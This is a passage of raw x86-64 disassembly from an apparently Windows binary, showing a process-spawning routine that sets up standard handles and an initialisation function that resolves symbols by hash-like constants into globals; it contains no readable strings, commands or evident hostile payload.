    6968a2ed:	48 89 44 24 58       	mov    %rax,0x58(%rsp)
    6968a2f2:	e8 d5 76 ff ff       	call   0x696819cc
    6968a2f7:	ba 50 00 00 00       	mov    $0x50,%edx
    6968a2fc:	48 c7 84 24 90 00 00 	movq   $0x0,0x90(%rsp)
    6968a303:	00 00 00 00 00 
    6968a308:	48 8d 0d f1 21 10 00 	lea    0x1021f1(%rip),%rcx        # 0x6978c500
    6968a30f:	48 c7 84 24 88 00 00 	movq   $0x0,0x88(%rsp)
    6968a316:	00 00 00 00 00 
    6968a31b:	48 c7 84 24 80 00 00 	movq   $0x0,0x80(%rsp)
    6968a322:	00 00 00 00 00 
    6968a327:	e8 2b cf ff ff       	call   0x69687257
    6968a32c:	48 89 c3             	mov    %rax,%rbx
    6968a32f:	48 8d 05 ea 20 10 00 	lea    0x1020ea(%rip),%rax        # 0x6978c420
    6968a336:	40 88 73 4d          	mov    %sil,0x4d(%rbx)
    6968a33a:	48 89 03             	mov    %rax,(%rbx)
    6968a33d:	89 f0                	mov    %esi,%eax
    6968a33f:	24 10                	and    $0x10,%al
    6968a341:	c6 43 4c 01          	movb   $0x1,0x4c(%rbx)
    6968a345:	c7 84 24 b8 00 00 00 	movl   $0x68,0xb8(%rsp)
    6968a34c:	68 00 00 00 
    6968a350:	88 44 24 67          	mov    %al,0x67(%rsp)
    6968a354:	74 54                	je     0x6968a3aa
    6968a356:	b9 f4 ff ff ff       	mov    $0xfffffff4,%ecx
    6968a35b:	ff 15 a7 b1 0f 00    	call   *0xfb1a7(%rip)        # 0x69785508
    6968a361:	b9 f6 ff ff ff       	mov    $0xfffffff6,%ecx
    6968a366:	48 89 84 24 18 01 00 	mov    %rax,0x118(%rsp)
    6968a36d:	00 
    6968a36e:	ff 15 94 b1 0f 00    	call   *0xfb194(%rip)        # 0x69785508
    6968a374:	b9 f5 ff ff ff       	mov    $0xfffffff5,%ecx
    6968a379:	48 89 84 24 08 01 00 	mov    %rax,0x108(%rsp)
    6968a380:	00 
    6968a381:	ff 15 81 b1 0f 00    	call   *0xfb181(%rip)        # 0x69785508
    6968a387:	48 8b 94 24 08 01 00 	mov    0x108(%rsp),%rdx
    6968a38e:	00 
    6968a38f:	48 89 84 24 10 01 00 	mov    %rax,0x110(%rsp)
    6968a396:	00 
    6968a397:	89 43 1c             	mov    %eax,0x1c(%rbx)
    6968a39a:	48 8b 84 24 18 01 00 	mov    0x118(%rsp),%rax
    6968a3a1:	00 
    6968a3a2:	89 53 18             	mov    %edx,0x18(%rbx)
    6968a3a5:	e9 29 01 00 00       	jmp    0x6968a4d3
    6968a3aa:	c7 84 24 f4 00 00 00 	movl   $0x100,0xf4(%rsp)
    6968a3b1:	00 01 00 00 
    6968a3b5:	40 f6 c6 20          	test   $0x20,%sil
    6968a3b9:	4c 8d 84 24 88 00 00 	lea    0x88(%rsp),%r8
    6968a3c0:	00 
    6968a3c1:	48 8d 94 24 90 00 00 	lea    0x90(%rsp),%rdx
    6968a3c8:	00 
    6968a3c9:	74 1a                	je     0x6968a3e5
    6968a3cb:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
    6968a3d0:	4c 8d 8c 24 80 00 00 	lea    0x80(%rsp),%r9
    6968a3d7:	00 
    6968a3d8:	48 89 f9             	mov    %rdi,%rcx
    6968a3db:	e8 5b fc ff ff       	call   0x6968a03b
    6968a3e0:	e9 d0 00 00 00       	jmp    0x6968a4b5
    6968a3e5:	48 8d 4f 50          	lea    0x50(%rdi),%rcx
    6968a3e9:	4c 89 44 24 68       	mov    %r8,0x68(%rsp)
    6968a3ee:	e8 19 ee ff ff       	call   0x6968920c
    6968a3f3:	4c 8b 44 24 68       	mov    0x68(%rsp),%r8
    6968a3f8:	48 8d 57 58          	lea    0x58(%rdi),%rdx
    6968a3fc:	4c 89 c1             	mov    %r8,%rcx
    6968a3ff:	e8 08 ee ff ff       	call   0x6968920c
    6968a404:	40 f6 c6 08          	test   $0x8,%sil
    6968a408:	75 3b                	jne    0x6968a445
    6968a40a:	48 8d 57 60          	lea    0x60(%rdi),%rdx
    6968a40e:	48 8d 8c 24 80 00 00 	lea    0x80(%rsp),%rcx
    6968a415:	00 
    6968a416:	e8 f1 ed ff ff       	call   0x6968920c
    6968a41b:	45 31 c0             	xor    %r8d,%r8d
    6968a41e:	ba 01 00 00 00       	mov    $0x1,%edx
    6968a423:	48 8b 8c 24 80 00 00 	mov    0x80(%rsp),%rcx
    6968a42a:	00 
    6968a42b:	ff 15 f7 24 10 00    	call   *0x1024f7(%rip)        # 0x6978c928
    6968a431:	85 c0                	test   %eax,%eax
    6968a433:	75 30                	jne    0x6968a465
    6968a435:	e8 c7 84 ff ff       	call   0x69682901
    6968a43a:	31 d2                	xor    %edx,%edx
    6968a43c:	89 c1                	mov    %eax,%ecx
    6968a43e:	e8 69 ec ff ff       	call   0x696890ac
    6968a443:	eb 20                	jmp    0x6968a465
    6968a445:	48 8b 84 24 10 01 00 	mov    0x110(%rsp),%rax
    6968a44c:	00 
    6968a44d:	48 89 84 24 18 01 00 	mov    %rax,0x118(%rsp)
    6968a454:	00 
    6968a455:	48 8b 84 24 88 00 00 	mov    0x88(%rsp),%rax
    6968a45c:	00 
    6968a45d:	48 89 84 24 80 00 00 	mov    %rax,0x80(%rsp)
    6968a464:	00 
    6968a465:	45 31 c0             	xor    %r8d,%r8d
    6968a468:	ba 01 00 00 00       	mov    $0x1,%edx
    6968a46d:	48 8b 8c 24 90 00 00 	mov    0x90(%rsp),%rcx
    6968a474:	00 
    6968a475:	ff 15 ad 24 10 00    	call   *0x1024ad(%rip)        # 0x6978c928
    6968a47b:	85 c0                	test   %eax,%eax
    6968a47d:	75 0e                	jne    0x6968a48d
    6968a47f:	e8 7d 84 ff ff       	call   0x69682901
    6968a484:	31 d2                	xor    %edx,%edx
    6968a486:	89 c1                	mov    %eax,%ecx
    6968a488:	e8 1f ec ff ff       	call   0x696890ac
    6968a48d:	45 31 c0             	xor    %r8d,%r8d
    6968a490:	ba 01 00 00 00       	mov    $0x1,%edx
    6968a495:	48 8b 8c 24 88 00 00 	mov    0x88(%rsp),%rcx
    6968a49c:	00 
    6968a49d:	ff 15 85 24 10 00    	call   *0x102485(%rip)        # 0x6978c928
    6968a4a3:	85 c0                	test   %eax,%eax
    6968a4a5:	75 0e                	jne    0x6968a4b5
    6968a4a7:	e8 55 84 ff ff       	call   0x69682901
    6968a4ac:	31 d2                	xor    %edx,%edx
    6968a4ae:	89 c1                	mov    %eax,%ecx
    6968a4b0:	e8 f7 eb ff ff       	call   0x696890ac
    6968a4b5:	48 8b 84 24 90 00 00 	mov    0x90(%rsp),%rax
    6968a4bc:	00 
    6968a4bd:	89 43 18             	mov    %eax,0x18(%rbx)
    6968a4c0:	48 8b 84 24 88 00 00 	mov    0x88(%rsp),%rax
    6968a4c7:	00 
    6968a4c8:	89 43 1c             	mov    %eax,0x1c(%rbx)
    6968a4cb:	48 8b 84 24 80 00 00 	mov    0x80(%rsp),%rax
    6968a4d2:	00 
    6968a4d3:	40 f6 c6 04          	test   $0x4,%sil
    6968a4d7:	89 43 20             	mov    %eax,0x20(%rbx)
    6968a4da:	4c 89 e1             	mov    %r12,%rcx
    6968a4dd:	75 0e                	jne    0x6968a4ed
    6968a4df:	4d 89 f0             	mov    %r14,%r8
    6968a4e2:	4c 89 ea             	mov    %r13,%rdx
    6968a4e5:	e8 d9 dd ff ff       	call   0x696882c3
    6968a4ea:	48 89 c1             	mov    %rax,%rcx
    6968a4ed:	e8 0c 74 ff ff       	call   0x696818fe
    6968a4f2:	45 31 ed             	xor    %r13d,%r13d
    6968a4f5:	48 85 ed             	test   %rbp,%rbp
    6968a4f8:	49 89 c6             	mov    %rax,%r14
    6968a4fb:	74 12                	je     0x6968a50f
    6968a4fd:	48 83 7d 00 00       	cmpq   $0x0,0x0(%rbp)
    6968a502:	7e 0b                	jle    0x6968a50f
    6968a504:	48 89 e9             	mov    %rbp,%rcx
    6968a507:	e8 f2 73 ff ff       	call   0x696818fe
    6968a50c:	49 89 c5             	mov    %rax,%r13
    6968a50f:	49 83 cf ff          	or     $0xffffffffffffffff,%r15
    6968a513:	31 ed                	xor    %ebp,%ebp
    6968a515:	48 83 bc 24 90 01 00 	cmpq   $0x0,0x190(%rsp)
    6968a51c:	00 00 
    6968a51e:	74 1c                	je     0x6968a53c
    6968a520:	48 8b 94 24 90 01 00 	mov    0x190(%rsp),%rdx
    6968a527:	00 
    6968a528:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
    6968a52d:	e8 2c d0 ff ff       	call   0x6968755e
    6968a532:	48 8b 6c 24 70       	mov    0x70(%rsp),%rbp
    6968a537:	4c 8b 7c 24 78       	mov    0x78(%rsp),%r15
    6968a53c:	40 f6 c6 01          	test   $0x1,%sil
    6968a540:	74 3c                	je     0x6968a57e
    6968a542:	4c 8d 84 24 98 00 00 	lea    0x98(%rsp),%r8
    6968a549:	00 
    6968a54a:	ba 08 00 00 00       	mov    $0x8,%edx
    6968a54f:	4c 89 c1             	mov    %r8,%rcx
    6968a552:	4c 89 44 24 68       	mov    %r8,0x68(%rsp)
    6968a557:	e8 70 74 ff ff       	call   0x696819cc
    6968a55c:	4c 89 f1             	mov    %r14,%rcx
    6968a55f:	e8 34 de ff ff       	call   0x69688398
    6968a564:	4c 8b 44 24 68       	mov    0x68(%rsp),%r8
    6968a569:	ba 01 00 00 00       	mov    $0x1,%edx
    6968a56e:	48 89 84 24 98 00 00 	mov    %rax,0x98(%rsp)
    6968a575:	00 
    6968a576:	4c 89 c1             	mov    %r8,%rcx
    6968a579:	e8 c2 f5 ff ff       	call   0x69689b40
    6968a57e:	4c 89 f1             	mov    %r14,%rcx
    6968a581:	45 31 f6             	xor    %r14d,%r14d
    6968a584:	e8 08 e3 ff ff       	call   0x69688891
    6968a589:	48 85 ed             	test   %rbp,%rbp
    6968a58c:	48 89 44 24 68       	mov    %rax,0x68(%rsp)
    6968a591:	74 0e                	je     0x6968a5a1
    6968a593:	4c 89 fa             	mov    %r15,%rdx
    6968a596:	48 89 e9             	mov    %rbp,%rcx
    6968a599:	e8 48 e1 ff ff       	call   0x696886e6
    6968a59e:	49 89 c6             	mov    %rax,%r14
    6968a5a1:	4c 89 e9             	mov    %r13,%rcx
    6968a5a4:	e8 e8 e2 ff ff       	call   0x69688891
    6968a5a9:	89 f2                	mov    %esi,%edx
    6968a5ab:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
    6968a5b0:	48 89 7c 24 40       	mov    %rdi,0x40(%rsp)
    6968a5b5:	83 e2 40             	and    $0x40,%edx
    6968a5b8:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
    6968a5bd:	80 fa 01             	cmp    $0x1,%dl
    6968a5c0:	4c 89 74 24 30       	mov    %r14,0x30(%rsp)
    6968a5c5:	19 d2                	sbb    %edx,%edx
    6968a5c7:	c7 44 24 20 01 00 00 	movl   $0x1,0x20(%rsp)
    6968a5ce:	00 
    6968a5cf:	45 31 c9             	xor    %r9d,%r9d
    6968a5d2:	45 31 c0             	xor    %r8d,%r8d
    6968a5d5:	81 e2 00 00 00 f8    	and    $0xf8000000,%edx
    6968a5db:	48 89 4c 24 48       	mov    %rcx,0x48(%rsp)
    6968a5e0:	31 c9                	xor    %ecx,%ecx
    6968a5e2:	81 c2 20 04 00 08    	add    $0x8000420,%edx
    6968a5e8:	89 54 24 28          	mov    %edx,0x28(%rsp)
    6968a5ec:	48 8b 54 24 68       	mov    0x68(%rsp),%rdx
    6968a5f1:	ff 15 d9 22 10 00    	call   *0x1022d9(%rip)        # 0x6978c8d0
    6968a5f7:	41 89 c5             	mov    %eax,%r13d
    6968a5fa:	e8 02 83 ff ff       	call   0x69682901
    6968a5ff:	80 7c 24 67 00       	cmpb   $0x0,0x67(%rsp)
    6968a604:	89 c7                	mov    %eax,%edi
    6968a606:	75 63                	jne    0x6968a66b
    6968a608:	48 8b 8c 24 08 01 00 	mov    0x108(%rsp),%rcx
    6968a60f:	00 
    6968a610:	48 83 f9 04          	cmp    $0x4,%rcx
    6968a614:	7e 11                	jle    0x6968a627
    6968a616:	e8 c6 ea ff ff       	call   0x696890e1
    6968a61b:	48 c7 84 24 08 01 00 	movq   $0xffffffffffffffff,0x108(%rsp)
    6968a622:	00 ff ff ff ff 
    6968a627:	48 8b 8c 24 10 01 00 	mov    0x110(%rsp),%rcx
    6968a62e:	00 
    6968a62f:	48 83 f9 04          	cmp    $0x4,%rcx
    6968a633:	7e 11                	jle    0x6968a646
    6968a635:	e8 a7 ea ff ff       	call   0x696890e1
    6968a63a:	48 c7 84 24 10 01 00 	movq   $0xffffffffffffffff,0x110(%rsp)
    6968a641:	00 ff ff ff ff 
    6968a646:	40 80 e6 08          	and    $0x8,%sil
    6968a64a:	75 1f                	jne    0x6968a66b
    6968a64c:	48 8b 8c 24 18 01 00 	mov    0x118(%rsp),%rcx
    6968a653:	00 
    6968a654:	48 83 f9 04          	cmp    $0x4,%rcx
    6968a658:	7e 11                	jle    0x6968a66b
    6968a65a:	e8 82 ea ff ff       	call   0x696890e1
    6968a65f:	48 c7 84 24 18 01 00 	movq   $0xffffffffffffffff,0x118(%rsp)
    6968a666:	00 ff ff ff ff 
    6968a66b:	48 85 ed             	test   %rbp,%rbp
    6968a66e:	74 08                	je     0x6968a678
    6968a670:	48 89 e9             	mov    %rbp,%rcx
    6968a673:	e8 19 b6 ff ff       	call   0x69685c91
    6968a678:	45 85 ed             	test   %r13d,%r13d
    6968a67b:	75 31                	jne    0x6968a6ae
    6968a67d:	f6 43 4d 20          	testb  $0x20,0x4d(%rbx)
    6968a681:	74 08                	je     0x6968a68b
    6968a683:	48 89 d9             	mov    %rbx,%rcx
    6968a686:	e8 b2 ea ff ff       	call   0x6968913d
    6968a68b:	83 ff 57             	cmp    $0x57,%edi
    6968a68e:	4c 89 e2             	mov    %r12,%rdx
    6968a691:	74 05                	je     0x6968a698
    6968a693:	83 ff 02             	cmp    $0x2,%edi
    6968a696:	75 0f                	jne    0x6968a6a7
    6968a698:	48 8d 0d c1 47 00 00 	lea    0x47c1(%rip),%rcx        # 0x6968ee60
    6968a69f:	e8 04 ef ff ff       	call   0x696895a8
    6968a6a4:	48 89 c2             	mov    %rax,%rdx
    6968a6a7:	89 f9                	mov    %edi,%ecx
    6968a6a9:	e8 fe e9 ff ff       	call   0x696890ac
    6968a6ae:	48 8b 84 24 a0 00 00 	mov    0xa0(%rsp),%rax
    6968a6b5:	00 
    6968a6b6:	c6 43 4c 00          	movb   $0x0,0x4c(%rbx)
    6968a6ba:	48 89 43 08          	mov    %rax,0x8(%rbx)
    6968a6be:	48 8b 84 24 a8 00 00 	mov    0xa8(%rsp),%rax
    6968a6c5:	00 
    6968a6c6:	48 89 43 10          	mov    %rax,0x10(%rbx)
    6968a6ca:	48 63 84 24 b0 00 00 	movslq 0xb0(%rsp),%rax
    6968a6d1:	00 
    6968a6d2:	48 89 43 28          	mov    %rax,0x28(%rbx)
    6968a6d6:	48 89 d8             	mov    %rbx,%rax
    6968a6d9:	48 81 c4 28 01 00 00 	add    $0x128,%rsp
    6968a6e0:	5b                   	pop    %rbx
    6968a6e1:	5e                   	pop    %rsi
    6968a6e2:	5f                   	pop    %rdi
    6968a6e3:	5d                   	pop    %rbp
    6968a6e4:	41 5c                	pop    %r12
    6968a6e6:	41 5d                	pop    %r13
    6968a6e8:	41 5e                	pop    %r14
    6968a6ea:	41 5f                	pop    %r15
    6968a6ec:	c3                   	ret
    6968a6ed:	57                   	push   %rdi
    6968a6ee:	56                   	push   %rsi
    6968a6ef:	48 83 ec 58          	sub    $0x58,%rsp
    6968a6f3:	48 8d 0d 1b c3 ff ff 	lea    -0x3ce5(%rip),%rcx        # 0x69686a15
    6968a6fa:	e8 08 9f ff ff       	call   0x69684607
    6968a6ff:	48 8d 0d 01 c3 ff ff 	lea    -0x3cff(%rip),%rcx        # 0x69686a07
    6968a706:	e8 fc 9e ff ff       	call   0x69684607
    6968a70b:	48 8d 0d e7 c2 ff ff 	lea    -0x3d19(%rip),%rcx        # 0x696869f9
    6968a712:	e8 f0 9e ff ff       	call   0x69684607
    6968a717:	48 8d 0d cd c2 ff ff 	lea    -0x3d33(%rip),%rcx        # 0x696869eb
    6968a71e:	e8 e4 9e ff ff       	call   0x69684607
    6968a723:	48 8d 0d b3 c2 ff ff 	lea    -0x3d4d(%rip),%rcx        # 0x696869dd
    6968a72a:	e8 d8 9e ff ff       	call   0x69684607
    6968a72f:	48 8d 0d 99 c2 ff ff 	lea    -0x3d67(%rip),%rcx        # 0x696869cf
    6968a736:	e8 cc 9e ff ff       	call   0x69684607
    6968a73b:	48 8d 0d 57 c2 ff ff 	lea    -0x3da9(%rip),%rcx        # 0x69686999
    6968a742:	e8 c0 9e ff ff       	call   0x69684607
    6968a747:	48 8d 0d 3d c2 ff ff 	lea    -0x3dc3(%rip),%rcx        # 0x6968698b
    6968a74e:	e8 b4 9e ff ff       	call   0x69684607
    6968a753:	48 8d 0d 23 c2 ff ff 	lea    -0x3ddd(%rip),%rcx        # 0x6968697d
    6968a75a:	e8 a8 9e ff ff       	call   0x69684607
    6968a75f:	48 8d 0d 09 c2 ff ff 	lea    -0x3df7(%rip),%rcx        # 0x6968696f
    6968a766:	e8 9c 9e ff ff       	call   0x69684607
    6968a76b:	48 8d 0d ef c1 ff ff 	lea    -0x3e11(%rip),%rcx        # 0x69686961
    6968a772:	e8 90 9e ff ff       	call   0x69684607
    6968a777:	48 8d 0d d5 c1 ff ff 	lea    -0x3e2b(%rip),%rcx        # 0x69686953
    6968a77e:	e8 84 9e ff ff       	call   0x69684607
    6968a783:	48 8d 0d bb c1 ff ff 	lea    -0x3e45(%rip),%rcx        # 0x69686945
    6968a78a:	e8 78 9e ff ff       	call   0x69684607
    6968a78f:	48 8d 0d a1 c1 ff ff 	lea    -0x3e5f(%rip),%rcx        # 0x69686937
    6968a796:	e8 6c 9e ff ff       	call   0x69684607
    6968a79b:	48 8d 0d 87 c1 ff ff 	lea    -0x3e79(%rip),%rcx        # 0x69686929
    6968a7a2:	e8 60 9e ff ff       	call   0x69684607
    6968a7a7:	48 8d 0d 6d c1 ff ff 	lea    -0x3e93(%rip),%rcx        # 0x6968691b
    6968a7ae:	e8 54 9e ff ff       	call   0x69684607
    6968a7b3:	48 8d 0d 53 c1 ff ff 	lea    -0x3ead(%rip),%rcx        # 0x6968690d
    6968a7ba:	e8 48 9e ff ff       	call   0x69684607
    6968a7bf:	48 8d 0d 39 c1 ff ff 	lea    -0x3ec7(%rip),%rcx        # 0x696868ff
    6968a7c6:	e8 3c 9e ff ff       	call   0x69684607
    6968a7cb:	48 8d 0d 1f c1 ff ff 	lea    -0x3ee1(%rip),%rcx        # 0x696868f1
    6968a7d2:	e8 30 9e ff ff       	call   0x69684607
    6968a7d7:	48 8d 0d 05 c1 ff ff 	lea    -0x3efb(%rip),%rcx        # 0x696868e3
    6968a7de:	e8 24 9e ff ff       	call   0x69684607
    6968a7e3:	48 8d 0d eb c0 ff ff 	lea    -0x3f15(%rip),%rcx        # 0x696868d5
    6968a7ea:	e8 18 9e ff ff       	call   0x69684607
    6968a7ef:	48 8d 0d d1 c0 ff ff 	lea    -0x3f2f(%rip),%rcx        # 0x696868c7
    6968a7f6:	e8 0c 9e ff ff       	call   0x69684607
    6968a7fb:	48 8d 0d ba c0 ff ff 	lea    -0x3f46(%rip),%rcx        # 0x696868bc
    6968a802:	e8 00 9e ff ff       	call   0x69684607
    6968a807:	48 8d 0d a3 c0 ff ff 	lea    -0x3f5d(%rip),%rcx        # 0x696868b1
    6968a80e:	e8 f4 9d ff ff       	call   0x69684607
    6968a813:	48 8d 0d 8c c0 ff ff 	lea    -0x3f74(%rip),%rcx        # 0x696868a6
    6968a81a:	e8 e8 9d ff ff       	call   0x69684607
    6968a81f:	48 8d 0d 75 c0 ff ff 	lea    -0x3f8b(%rip),%rcx        # 0x6968689b
    6968a826:	e8 dc 9d ff ff       	call   0x69684607
    6968a82b:	48 8d 0d 5e c0 ff ff 	lea    -0x3fa2(%rip),%rcx        # 0x69686890
    6968a832:	e8 d0 9d ff ff       	call   0x69684607
    6968a837:	ba 64 8c 9c 60       	mov    $0x609c8c64,%edx
    6968a83c:	48 8d 0d 5d af 0e 00 	lea    0xeaf5d(%rip),%rcx        # 0x697757a0
    6968a843:	e8 d2 d0 ff ff       	call   0x6968791a
    6968a848:	48 8d 0d 39 a8 0f 00 	lea    0xfa839(%rip),%rcx        # 0x69785088
    6968a84f:	48 89 c2             	mov    %rax,%rdx
    6968a852:	e8 44 bb ff ff       	call   0x6968639b
    6968a857:	ba 04 3d e5 2b       	mov    $0x2be53d04,%edx
    6968a85c:	48 8d 0d 5d ae 0e 00 	lea    0xeae5d(%rip),%rcx        # 0x697756c0
    6968a863:	e8 b2 d0 ff ff       	call   0x6968791a
    6968a868:	48 8d 0d b1 ac 0f 00 	lea    0xfacb1(%rip),%rcx        # 0x69785520
    6968a86f:	48 89 c2             	mov    %rax,%rdx
    6968a872:	e8 24 bb ff ff       	call   0x6968639b
    6968a877:	ba 4c 0d df 1d       	mov    $0x1ddf0d4c,%edx
    6968a87c:	48 8d 0d dd ad 0e 00 	lea    0xeaddd(%rip),%rcx        # 0x69775660
    6968a883:	e8 92 d0 ff ff       	call   0x6968791a
    6968a888:	48 8d 0d 11 ac 0f 00 	lea    0xfac11(%rip),%rcx        # 0x697854a0
    6968a88f:	48 89 c2             	mov    %rax,%rdx
    6968a892:	e8 04 bb ff ff       	call   0x6968639b
    6968a897:	ba a4 ee 21 52       	mov    $0x5221eea4,%edx
    6968a89c:	48 8d 0d 1d ad 0e 00 	lea    0xead1d(%rip),%rcx        # 0x697755c0
    6968a8a3:	e8 72 d0 ff ff       	call   0x6968791a
    6968a8a8:	48 8d 0d 11 02 0f 00 	lea    0xf0211(%rip),%rcx        # 0x6977aac0
    6968a8af:	48 89 c2             	mov    %rax,%rdx
    6968a8b2:	e8 e4 ba ff ff       	call   0x6968639b
    6968a8b7:	ba 44 09 ed 10       	mov    $0x10ed0944,%edx
    6968a8bc:	48 8d 0d fd ab 0e 00 	lea    0xeabfd(%rip),%rcx        # 0x697754c0
    6968a8c3:	e8 52 d0 ff ff       	call   0x6968791a
    6968a8c8:	48 8d 0d 91 a8 0f 00 	lea    0xfa891(%rip),%rcx        # 0x69785160
    6968a8cf:	48 89 c2             	mov    %rax,%rdx
    6968a8d2:	e8 c4 ba ff ff       	call   0x6968639b
    6968a8d7:	48 8d 0d c2 ab 0e 00 	lea    0xeabc2(%rip),%rcx        # 0x697754a0
    6968a8de:	e8 b5 ce ff ff       	call   0x69687798
    6968a8e3:	ba 01 00 00 00       	mov    $0x1,%edx
    6968a8e8:	48 89 c1             	mov    %rax,%rcx
    6968a8eb:	e8 5c d4 ff ff       	call   0x69687d4c
    6968a8f0:	45 31 c9             	xor    %r9d,%r9d
    6968a8f3:	45 31 c0             	xor    %r8d,%r8d
    6968a8f6:	48 8d 15 48 3a 00 00 	lea    0x3a48(%rip),%rdx        # 0x6968e345
    6968a8fd:	48 89 c1             	mov    %rax,%rcx
    6968a900:	e8 69 d2 ff ff       	call   0x69687b6e
    6968a905:	48 8d 0d 94 ab 0e 00 	lea    0xeab94(%rip),%rcx        # 0x697754a0
    6968a90c:	48 89 05 f5 a7 0f 00 	mov    %rax,0xfa7f5(%rip)        # 0x69785108
    6968a913:	e8 80 ce ff ff       	call   0x69687798
    6968a918:	ba 01 00 00 00       	mov    $0x1,%edx
    6968a91d:	48 89 c1             	mov    %rax,%rcx
    6968a920:	e8 27 d4 ff ff       	call   0x69687d4c
    6968a925:	45 31 c9             	xor    %r9d,%r9d
    6968a928:	45 31 c0             	xor    %r8d,%r8d
    6968a92b:	48 8d 15 14 3d 00 00 	lea    0x3d14(%rip),%rdx        # 0x6968e646
    6968a932:	48 89 c1             	mov    %rax,%rcx
    6968a935:	e8 34 d2 ff ff       	call   0x69687b6e
    6968a93a:	48 8d 0d 5f ab 0e 00 	lea    0xeab5f(%rip),%rcx        # 0x697754a0
    6968a941:	48 89 05 a0 a2 0f 00 	mov    %rax,0xfa2a0(%rip)        # 0x69784be8
    6968a948:	e8 4b ce ff ff       	call   0x69687798
    6968a94d:	ba 01 00 00 00       	mov    $0x1,%edx
    6968a952:	48 89 c1             	mov    %rax,%rcx
    6968a955:	e8 f2 d3 ff ff       	call   0x69687d4c
    6968a95a:	45 31 c9             	xor    %r9d,%r9d
    6968a95d:	45 31 c0             	xor    %r8d,%r8d
    6968a960:	48 8d 15 5c 3a 00 00 	lea    0x3a5c(%rip),%rdx        # 0x6968e3c3
    6968a967:	48 89 c1             	mov    %rax,%rcx
    6968a96a:	e8 ff d1 ff ff       	call   0x69687b6e
    6968a96f:	48 8d 0d 2a ab 0e 00 	lea    0xeab2a(%rip),%rcx        # 0x697754a0
    6968a976:	48 89 05 13 1e 10 00 	mov    %rax,0x101e13(%rip)        # 0x6978c790
    6968a97d:	e8 16 ce ff ff       	call   0x69687798
    6968a982:	ba 01 00 00 00       	mov    $0x1,%edx
    6968a987:	48 89 c1             	mov    %rax,%rcx
    6968a98a:	e8 bd d3 ff ff       	call   0x69687d4c
    6968a98f:	45 31 c9             	xor    %r9d,%r9d
    6968a992:	45 31 c0             	xor    %r8d,%r8d
    6968a995:	48 8d 15 be 3c 00 00 	lea    0x3cbe(%rip),%rdx        # 0x6968e65a
    6968a99c:	48 89 c1             	mov    %rax,%rcx
    6968a99f:	e8 ca d1 ff ff       	call   0x69687b6e
    6968a9a4:	48 89 05 35 70 0f 00 	mov    %rax,0xf7035(%rip)        # 0x697819e0
    6968a9ab:	e8 07 f2 ff ff       	call   0x69689bb7
    6968a9b0:	84 c0                	test   %al,%al
    6968a9b2:	0f 85 f5 02 00 00    	jne    0x6968acad
    6968a9b8:	48 8d 0d 21 a9 0e 00 	lea    0xea921(%rip),%rcx        # 0x697752e0
    6968a9bf:	ba 0c 31 01 0f       	mov    $0xf01310c,%edx
    6968a9c4:	e8 51 cf ff ff       	call   0x6968791a
    6968a9c9:	48 8d 0d 98 1e 10 00 	lea    0x101e98(%rip),%rcx        # 0x6978c868
    6968a9d0:	48 89 c2             	mov    %rax,%rdx
    6968a9d3:	e8 c3 b9 ff ff       	call   0x6968639b
    6968a9d8:	31 c9                	xor    %ecx,%ecx
    6968a9da:	e8 a9 ca ff ff       	call   0x69687488
    6968a9df:	ba e4 35 e0 2a       	mov    $0x2ae035e4,%edx
    6968a9e4:	48 8d 0d 95 a8 0e 00 	lea    0xea895(%rip),%rcx        # 0x69775280
    6968a9eb:	e8 2a cf ff ff       	call   0x6968791a
    6968a9f0:	48 8d 0d 19 ab 0f 00 	lea    0xfab19(%rip),%rcx        # 0x69785510
    6968a9f7:	48 89 c2             	mov    %rax,%rdx
    6968a9fa:	e8 9c b9 ff ff       	call   0x6968639b
    6968a9ff:	48 8d 0d 9a aa 0e 00 	lea    0xeaa9a(%rip),%rcx        # 0x697754a0
    6968aa06:	e8 8d cd ff ff       	call   0x69687798
    6968aa0b:	ba 01 00 00 00       	mov    $0x1,%edx
    6968aa10:	48 89 c1             	mov    %rax,%rcx
    6968aa13:	e8 34 d3 ff ff       	call   0x69687d4c
    6968aa18:	45 31 c9             	xor    %r9d,%r9d
    6968aa1b:	45 31 c0             	xor    %r8d,%r8d
    6968aa1e:	48 8d 15 41 3c 00 00 	lea    0x3c41(%rip),%rdx        # 0x6968e666
    6968aa25:	48 89 c1             	mov    %rax,%rcx
    6968aa28:	e8 41 d1 ff ff       	call   0x69687b6e
    6968aa2d:	48 8d 0d 6c aa 0e 00 	lea    0xeaa6c(%rip),%rcx        # 0x697754a0
    6968aa34:	48 89 05 95 00 0f 00 	mov    %rax,0xf0095(%rip)        # 0x6977aad0
    6968aa3b:	e8 58 cd ff ff       	call   0x69687798
    6968aa40:	ba 01 00 00 00       	mov    $0x1,%edx
    6968aa45:	48 89 c1             	mov    %rax,%rcx
    6968aa48:	e8 ff d2 ff ff       	call   0x69687d4c
    6968aa4d:	45 31 c9             	xor    %r9d,%r9d
    6968aa50:	45 31 c0             	xor    %r8d,%r8d
    6968aa53:	48 8d 15 18 3c 00 00 	lea    0x3c18(%rip),%rdx        # 0x6968e672
    6968aa5a:	48 89 c1             	mov    %rax,%rcx
    6968aa5d:	e8 0c d1 ff ff       	call   0x69687b6e
    6968aa62:	48 8d 0d f7 a7 0e 00 	lea    0xea7f7(%rip),%rcx        # 0x69775260
    6968aa69:	48 89 05 58 a7 0f 00 	mov    %rax,0xfa758(%rip)        # 0x697851c8
    6968aa70:	e8 23 cd ff ff       	call   0x69687798
    6968aa75:	31 d2                	xor    %edx,%edx
    6968aa77:	48 89 c1             	mov    %rax,%rcx
    6968aa7a:	e8 cd d2 ff ff       	call   0x69687d4c
    6968aa7f:	45 31 c0             	xor    %r8d,%r8d
    6968aa82:	41 b9 01 00 00 00    	mov    $0x1,%r9d
    6968aa88:	48 8d 15 ef 3b 00 00 	lea    0x3bef(%rip),%rdx        # 0x6968e67e
    6968aa8f:	48 89 c1             	mov    %rax,%rcx
    6968aa92:	e8 d7 d0 ff ff       	call   0x69687b6e
    6968aa97:	48 8d 0d 02 aa 0e 00 	lea    0xeaa02(%rip),%rcx        # 0x697754a0
    6968aa9e:	48 89 05 fb 9b 0f 00 	mov    %rax,0xf9bfb(%rip)        # 0x697846a0
    6968aaa5:	e8 ee cc ff ff       	call   0x69687798
    6968aaaa:	ba 01 00 00 00       	mov    $0x1,%edx
    6968aaaf:	48 89 c1             	mov    %rax,%rcx
    6968aab2:	e8 95 d2 ff ff       	call   0x69687d4c
    6968aab7:	45 31 c9             	xor    %r9d,%r9d
